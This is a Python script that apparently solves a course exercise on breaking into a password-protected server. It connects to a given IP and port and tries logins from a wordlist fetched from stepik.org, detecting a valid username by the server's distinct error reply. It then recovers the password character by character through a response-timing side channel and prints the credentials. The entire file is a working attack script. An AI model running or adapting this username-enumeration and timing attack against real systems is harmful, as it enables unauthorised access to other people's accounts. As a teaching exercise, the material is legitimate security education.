import argparse
import socket
import itertools
import string
import urllib.request
import json
import time

parser = argparse.ArgumentParser(description='Stage 1/5: Establishing a connection')
parser.add_argument('ip', help="IP address")
parser.add_argument('port', type=int, help="Port number")
args = parser.parse_args()


def get_json(login, password):
    return json.dumps({'login': login, 'password': password})


def get_reply(json_string):
    return json.loads(json_string)['result']


def gen_char():
    for c in itertools.chain(string.ascii_letters, string.digits):
        yield c


with socket.socket() as client_socket:
    client_socket.connect((args.ip, args.port))

    # Find login
    correct_login = ''
    for line in urllib.request.urlopen('https://stepik.org/media/attachments/lesson/255258/logins.txt'):
        login_candidate = line.decode().strip()
        client_socket.send(get_json(login_candidate, '').encode())
        if get_reply(client_socket.recv(1024).decode()) == 'Wrong password!':
            correct_login = login_candidate
            break

    # Find password
    current_password = ''
    correct_password = ''
    try:
        while True:
            for char in gen_char():
                password_candidate = current_password + char
                start = time.perf_counter()
                client_socket.send(get_json(correct_login, password_candidate).encode())
                reply = get_reply(client_socket.recv(1024).decode())
                end = time.perf_counter()

                if reply == 'Connection success!':
                    correct_password = password_candidate
                    break

                if 10000 * (end - start) > 500:
                    current_password = password_candidate
                    break

    except ConnectionResetError:
        pass

    finally:
        print(get_json(correct_login, correct_password))
